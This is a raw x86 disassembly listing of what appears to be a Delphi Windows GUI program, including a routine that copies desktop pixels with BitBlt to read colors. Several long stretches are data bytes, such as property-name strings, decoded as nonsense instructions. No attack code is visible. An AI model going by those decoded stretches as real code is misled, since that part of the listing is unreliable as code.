mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x3c ]
mov ecx 0x5
mov eax esi
call sub_424fa8
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
retn
mov eax [ esi + 0x10 ]
mov edx 0xffffff
call sub_424758
lea ecx [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
dec edx
mov eax [ ebp - 0x8 ]
dec eax
call sub_417088
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xa4 ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0xa0 ] eax
lea ecx [ ebp - 0x4c ]
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0x4 ]
call sub_417088
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x98 ] eax
lea ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x4 ]
inc edx
mov eax [ ebp - 0x8 ]
call sub_417088
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x94 ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x90 ] eax
lea ecx [ ebp - 0x5c ]
mov edx [ ebp - 0x4 ]
add edx ebx
inc edx
mov eax [ ebp - 0x8 ]
add eax ebx
call sub_417088
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x8c ] eax
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x88 ] eax
lea ecx [ ebp - 0x64 ]
mov edx [ ebp - 0x4 ]
sub edx ebx
mov eax edi
add eax [ ebp - 0x8 ]
add eax ebx
inc eax
call sub_417088
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x84 ] eax
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x80 ] eax
lea ecx [ ebp - 0x6c ]
mov edx [ ebp - 0x4 ]
sub edx ebx
dec edx
mov eax edi
add eax [ ebp - 0x8 ]
add eax ebx
inc eax
call sub_417088
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x78 ] eax
lea ecx [ ebp - 0xac ]
mov edx [ ebp - 0x4 ]
sub edx ebx
sub edx 0x2
mov eax edi
add eax [ ebp - 0x8 ]
add eax ebx
inc eax
call sub_417088
mov eax [ ebp - 0xac ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp - 0xa8 ]
mov [ ebp - 0x70 ] eax
lea edx [ ebp - 0xa4 ]
mov ecx 0x6
mov eax esi
call sub_424fa8
sub_46b74c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46b771
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b778
retn
sub_46b77c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_405ee4
xor edx edx
mov [ eax + 0x1c ] edx
call sub_405ee4
xor edx edx
mov [ eax + 0x20 ] edx
call sub_405ee4
xor edx edx
mov [ eax + 0x24 ] edx
call sub_405ee4
xor edx edx
mov [ eax + 0x28 ] edx
call sub_405ee4
xor edx edx
mov [ eax + 0x2c ] edx
call sub_405ee4
xor edx edx
mov [ eax + 0x30 ] edx
call sub_405ee4
xor edx edx
mov [ eax + 0x34 ] edx
call sub_405ee4
xor edx edx
mov [ eax + 0x38 ] edx
call sub_405ee4
xor edx edx
mov [ eax + 0x3c ] edx
sub_46b800
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xb9
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
mov ecx 0xb9200046
inc esi
add [ eax ] bh
add al [ eax ]
add [ ebx + edx * 2 + 0x14bc0044 ] ah
inc edx
add [ ebx + esi + 0x40 ] bh
add ah bh
or eax 0x33840042
inc eax
add [ eax - 0x2d ] dl
inc esp
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax - 0x46 ] al
inc esi
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ edx + edi * 4 - 0x4833ffba ] ch
inc esp
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add [ ecx + edi * 4 + 0x46 ] bl
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 - 0x7283ffbc ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax + 0xc ] 0xbd
inc esi
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al bl
mov esi 0xcc780044
inc esp
add [ eax - 0x46 ] dh
inc esi
add [ eax - 0x37 ] ah
inc esp
add [ eax + 0x100044c7 ] dl
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ ebx + ecx * 8 + 0x44 ] dh
add ah ch
test [ eax + eax + 0x2c ] 0xc0004515
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x1c ] 0xf40046ba
mov ecx 0x10046
adc al 0x0
add al 0xbc
inc esi
add [ 0x61685354 ] cl
outsd
ja r-xdata
add [ eax ] al
add [ edx + 0x32c0a101 ] dh
inc edx
add al ch
mov edx ebx
sti
dec [ ebx + 0x309e89d8 ]
add al [ eax ]
add [ ebx - 0x74fe4d3d ] cl
or bh bh
push ecx
insb
imul ebp [ esi + 0x64 ] 0xc08b776f
xor al 0xb9
inc esi
add [ edi ] al
or eax 0x61685354
outsd
ja r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ esi + 0x230 ]
mov dl 0x6
call sub_42a9f0
mov eax esi
call sub_4494d4
xor eax eax
mov [ esi + 0x220 ] eax
xor eax eax
mov [ esi + 0x21c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax esi
call sub_44cf0c
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add [ eax ] al
imul ebp [ esi + 0x64 ] 0xb848776f
inc esi
add ah dl
push esp
inc esp
add [ ebx ] cl
add [ ecx ] cl
push ebx
push 0x776f6461
push edi
outsb
add [ fs : eax ] al
lea eax [ eax ]
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov eax ebx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_451480
mov [ esi + 0x234 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_429418
mov ebx eax
mov [ esi + 0x230 ] ebx
add esp 0xfffffff0
call sub_40348c
sub_46b9f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x2c ]
mov al [ ebp + 0x8 ]
mov [ ebx + 0x234 ] al
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_46ba40
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x230 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4514dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_46ba70
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44c664
cmp [ esi + 0x190 ] 0x0
je r-xdata
mov [ ebx + 0x24 ] 0x809
or [ ebx + 0x8 ] 0x8
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
and eax 0xbfffffff
or eax 0x80000000
or eax 0x0
mov [ ebx + 0x4 ] eax
sub_46baac
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_448454
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x22c ]
jne r-xdata
xor eax eax
mov [ edi + 0x22c ] eax
xor edx edx
mov eax edi
call sub_448ecc
sub_46bae4
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4515d8
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_4170c4
mov edx esp
mov ecx [ ebx + 0x230 ]
mov eax [ ebx + 0x208 ]
call sub_42503c
add esp 0x10
pop ebx
retn
sub_46bb20
push ebx
push esi
add esp 0xffffffe8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x22c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x22c ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_421038
add esp 0x18
pop esi
pop ebx
retn
mov edx ebx
call sub_420e08
lea edx [ esp + 0x8 ]
mov eax [ ebx + 0x22c ]
call sub_44894c
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov esi [ ebx + 0x22c ]
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_4494d4
mov al [ ebx + 0x234 ]
sub al 0x1
jb r-xdata
lea edx [ esp + 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax esi
call sub_448ac4
push 0x4
mov eax [ ebx + 0x22c ]
mov edx [ eax + 0x4c ]
sub edx 0x4
push edx
mov ecx [ esp + 0xc ]
add ecx 0x4
mov edx [ eax + 0x48 ]
add edx [ esp + 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
jmp r-xdata
je r-xdata
mov eax ebx
call sub_4494dc
mov eax [ ebx + 0x22c ]
mov edx [ eax + 0x48 ]
push edx
push 0x4
mov ecx [ eax + 0x4c ]
add ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
add edx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
jmp r-xdata
sub_46bc0c
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov cx [ eax + 0x218 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x214 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov bx [ ebx + 0x216 ]
add bx dx
mov edx ebx
call sub_46ae5c
mov ebx eax
mov eax ebx
call sub_406b78
mov [ esi ] al
mov eax ebx
call sub_406b74
mov [ esi + 0x1 ] al
mov eax ebx
call sub_406b70
mov [ esi + 0x2 ] al
pop esi
pop ebx
pop ebp
retn
sub_46bc68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x220 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_46aa28
mov ax [ esi ]
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x224 ] ax
mov ax [ edi ]
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x228 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax ]
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x226 ] ax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov [ eax + 0x220 ] ebx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x224 ]
mov [ esi ] ax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x228 ]
mov [ edi ] ax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x226 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] ax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_46bd0c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f1c4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x48 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
call GetDesktopWindow
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46bdd8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xcc0020
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
call sub_4299e0
call sub_425280
push eax
call BitBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bddf
mov eax [ ebp - 0x8 ]
push eax
call GetDesktopWindow
push eax
call ReleaseDC
retn
sub_46bddf
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x234 ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
test eax eax
jl r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
inc eax
mov [ ebp - 0x10 ] eax
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
test eax eax
jl r-xdata
jmp r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
inc edi
xor ebx ebx
inc eax
mov [ ebp - 0x10 ] eax
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
mov edx esi
call sub_429b50
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x48 ]
dec edi
test edi edi
jl r-xdata
jmp r-xdata
inc ebx
dec edi
jne r-xdata
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov cl [ eax ]
mov eax [ ebp - 0x14 ]
mov dl [ eax + 0x1 ]
mov eax [ ebp - 0x14 ]
mov al [ eax + 0x2 ]
call sub_406b54
mov edx [ ebp - 0x4 ]
mov [ edx + 0x210 ] eax
push ebp
mov eax [ ebp - 0x4 ]
add eax 0x218
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x216 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x214 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_46bc68
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x216 ] 0x3a
jb r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
inc edi
mov eax esi
sub eax ebx
js r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp esi eax
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
mov edx esi
call sub_429b50
mov [ ebp - 0xc ] eax
mov ebx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x48 ]
dec edi
sub edi esi
sub edi ebx
jl r-xdata
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
cmp ebx eax
jg r-xdata
mov edx [ ebp - 0x4 ]
cmp esi [ edx + 0x4c ]
jl r-xdata
push ebp
mov edx ebx
shl edx 0x4
sub edx ebx
add edx 0xffffffc6
sub eax esi
add eax eax
lea eax [ eax + eax * 4 ]
add edx eax
push edx
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
pop edx
call sub_46bc0c
pop ecx
jmp r-xdata
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov cl [ eax ]
mov eax [ ebp - 0x18 ]
mov dl [ eax + 0x1 ]
mov eax [ ebp - 0x18 ]
mov al [ eax + 0x2 ]
call sub_406b54
mov edx [ ebp - 0x4 ]
mov [ edx + 0x210 ] eax
push ebp
mov eax [ ebp - 0x4 ]
add eax 0x218
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x216 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x214 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_46bc68
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x216 ] 0x3a
jb r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
sub edx eax
cmp ebx edx
jl r-xdata
push ebp
mov edx esi
shl edx 0x4
sub edx esi
add edx 0xffffffc6
sub eax ebx
add eax eax
lea eax [ eax + eax * 4 ]
add edx eax
push edx
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
pop edx
call sub_46bc0c
pop ecx
jmp r-xdata
push ebp
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
mov edx ebx
shl edx 0x4
sub edx ebx
add edx 0xffffffc6
call sub_46bc0c
pop ecx
push ebp
sub eax ebx
mov edx eax
shl eax 0x4
sub eax edx
mov edx 0xffffffc6
sub edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x8
sub eax esi
mov ecx eax
shl eax 0x4
sub eax ecx
sub edx eax
push edx
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
pop edx
call sub_46bc0c
pop ecx
jmp r-xdata
push ebp
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
mov edx esi
shl edx 0x4
sub edx esi
add edx 0xffffffc6
call sub_46bc0c
pop ecx
push ebp
sub eax esi
mov edx eax
shl eax 0x4
sub eax edx
mov edx 0xffffffc6
sub edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax 0x8
sub eax ebx
mov ecx eax
shl eax 0x4
sub eax ecx
sub edx eax
push edx
lea eax [ ebx + ebx * 2 ]
mov edx [ ebp - 0xc ]
lea eax [ edx + eax ]
pop edx
call sub_46bc0c
pop ecx
jmp r-xdata
sub_46c094
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46c0b9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c0c0
retn
sub_46c0d4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46c0f9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c100
retn
sub_46c110
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
rol [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 8 + 0x900046 ] dl
add [ eax ] al
and [ ebx + 0x47 ] dh
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add [ eax + 0x33 ] bh
ja r-xdata
popad
jo r-xdata
bound ebp [ ebp + 0x64 ]
inc ebx
outsd
insb
outsd
jb r-xdata
outsd
insb
outsd
jb r-xdata
xor eax [ eax ]
js r-xdata
rol [ esi ] 0x7
or edx [ eax + ebx * 2 + 0x50 ]
inc ebx
outsd
insb
outsd
jb r-xdata
jae r-xdata
and al 0x42
and al 0x42
add [ eax ] al
add bh bh
xor [ eax ] al
add dh bh
add [ eax ] eax
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add ah ah
mov ebx 0xbd0c0047
inc edi
add [ ebp + edi * 4 + 0x47 ] dh
add ah bh
les eax [ esi ]
or edx [ eax + ebx * 2 + 0x50 ]
inc ebx
outsd
insb
outsd
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] dh
mov esp 0x8df80047
inc ecx
add [ eax + 0x4210 ] dh
mov esi 0x11880047
inc edx
add [ esp + edi * 4 + 0x11980047 ] dl
inc edx
add [ eax - 0x2bffbdee ] dl
adc al 0x42
add [ eax - 0x5fffbdef ] ch
add eax [ eax ]
add eax 0x6f6c6f43
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
popad
jo r-xdata
add bh bh
push esp
add [ eax ] al
bound ebp [ ebp + 0x64 ]
add [ eax + eax ] ch
[ eax + eax ]
bound ebp [ ebp + 0x64 ]
inc esi
outsd
outsb
je r-xdata
inc esi
and al 0x42
jb r-xdata
add [ 0x6f6c6f43 ] al
rol [ esi ] 0xc4
jae r-xdata
or eax [ eax ]
outsd
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
and al 0x42
add [ eax + eax ] dl
call [ eax + eax ]
push 0x776f6461
dec eax
and al 0x42
add [ eax ] dl
add bh bh
xor al 0x0
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xfffff8 ] al
pop es
add [ ecx ] cl
inc esi
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0xfffff1 ] al
add [ esi ] dl
add [ 0x6e746341 ] cl
inc ebx
outsd
insb
outsd
jb r-xdata
or [ edx + 0xd007a86 ] 0x0
adc [ esi + 0x72 ] eax
outsd
insb
outsd
jb r-xdata
and al 0x42
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] ah
or al [ eax ]
or al 0x48
outsd
je r-xdata
add [ eax ] ah
or [ eax ] eax
or [ eax + 0x6f ] cl
je r-xdata
outsd
insb
outsd
jb r-xdata
outsd
outsb
je r-xdata
inc esi
outsd
outsb
je r-xdata
and al 0x42
add [ eax + eax ] cl
dec [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
inc [ esi ]
add [ edx ] dl
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
add [ eax - 0x44 ] ah
inc edi
add [ eax + eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4008080 ] 0x0
or eax 0x61736944
inc edx
popad
jo r-xdata
mov al [ esi + 0xf007a ]
adc eax 0x6d617246
je r-xdata
popad
insd
push esp
outsd
jo r-xdata
and al 0x42
add [ eax ] bh
add bh bh
js r-xdata
adc [ esi + 0x72 ] eax
popad
outsd
outsb
je r-xdata
insb
outsd
jb r-xdata
and al 0x42
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx ] 0x0
add bh bh
add eax 0x69441100
jae r-xdata
adc al 0x0
dec eax
and al 0x42
add [ eax ] bl
add bh bh
pop eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ 0x2ff0000 ] 0x0
or edx [ ebx + 0x68 ]
popad
outsd
shr edi cl
outsd
insd
push edx
imul esp [ edi + 0x68 ] 0x74754f74
jb r-xdata
inc esi
jb r-xdata
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xffffff ] al
or al 0x0
push cs
je r-xdata
inc esi
jb r-xdata
outsd
insb
outsd
jb r-xdata
jne r-xdata
and al 0x42
add [ eax + eax ] ah
arpl [ gs : ebp + 0x64 ] si
inc ebx
and al 0x42
add [ eax ] bh
add [ eax ] al
outsd
insb
outsd
jb r-xdata
inc edx
outsd
je r-xdata
insd
add [ eax + 0xc66931 ] al
adc [ eax ] al
or eax 0x466e7442
jb r-xdata
add [ eax ] al
add [ eax + 0xffffff ] al
adc [ eax ] eax
adc [ edx + 0x74 ] al
outsb
push ebx
insb
outsd
insd
push edx
add [ 0x6d617246 ] dl
outsb
outsb
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e6e4974
jb r-xdata
insd
push esp
outsd
jo r-xdata
je r-xdata
or [ ebp + 0x65 ] ecx
outsb
jne r-xdata
and al 0x42
add [ eax + eax ] dh
push [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xbff0000 ] 0x0
add [ eax ] al
dec [ ebx - 0xf7743d ]
push ecx
xor al 0xc7
inc ebx
js r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
inc esi
outsd
outsb
je r-xdata
add [ edx ] dl
add [ 0x656c6553 ] cl
arpl [ ebp + 0x64 ] si
and al 0x42
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh 0xd3
out dx eax
jmp [ eax + eax ]
insd
inc ebx
outsd
insb
outsd
jb r-xdata
add [ 0x6d617246 ] dl
and al 0x42
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
jb r-xdata
add [ 0x466e7442 ] cl
and al 0x42
add [ eax + eax + 0x84ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x7a868a ] al
lldt [ 0x6d617246 ]
inc edx
outsd
je r-xdata
popad
insd
and al 0x42
add [ eax + eax ] bh
add [ eax ] ah
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al 0x0
or edx [ ebp + 0x6e ]
pop eax
inc ecx
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0015 ] al
outsb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ 0x6f436e4f ] cl
outsd
insb
outsd
jb r-xdata
inc ebx
outsd
insb
outsd
jb r-xdata
arpl [ gs : ebp + 0x64 ] si
and al 0x42
add [ eax + eax ] dh
add bh bh
xor al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax + 0x8ba0080 ] 0x0
add bh bh
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebx + 0x78 ] 0xffffff
mov [ ebx + 0x7c ] 0x7a868a
mov [ ebx + 0x80 ] 0xffffff
mov [ ebx + 0x84 ] 0x7a868a
mov edx 0xf
mov eax 0xff00000f
call sub_46b0f8
mov [ ebx + 0x6c ] eax
mov [ ebx + 0x54 ] 0x20000000
mov [ ebx + 0x5c ] 0x20000000
mov [ ebx + 0x68 ] 0xefd3c6
xor eax eax
mov [ ebx + 0x64 ] eax
mov [ ebx + 0x58 ] 0xff000015
mov edx 0xf
mov eax 0xff00000f
call sub_46b0f8
mov [ ebx + 0x60 ] eax
pop ebx
retn
push 0x65676e61
mov eax eax
push ebx
mov ebx eax
mov eax ebx
call sub_47bdc8
mov edx 0xff00000f
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov [ ebx + 0x74 ] 0xff000005
mov [ ebx + 0x38 ] 0xc66931
mov [ ebx + 0x34 ] 0xff00000f
mov [ ebx + 0x48 ] 0xff000011
mov [ ebx + 0x4c ] 0xff000014
mov [ ebx + 0x44 ] 0x808080
mov edx 0xff000008
and al 0x42
add [ eax - 0x44 ] bh
inc edi
sub_46c2c1
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480e0008 ] al
imul esp [ edi + 0x68 ] 0x6867696c
je r-xdata
outsd
je r-xdata
outsd
insb
outsd
jb r-xdata
adc [ esi + 0x72 ] eax
popad
outsd
outsb
je r-xdata
jb r-xdata
and al 0x42
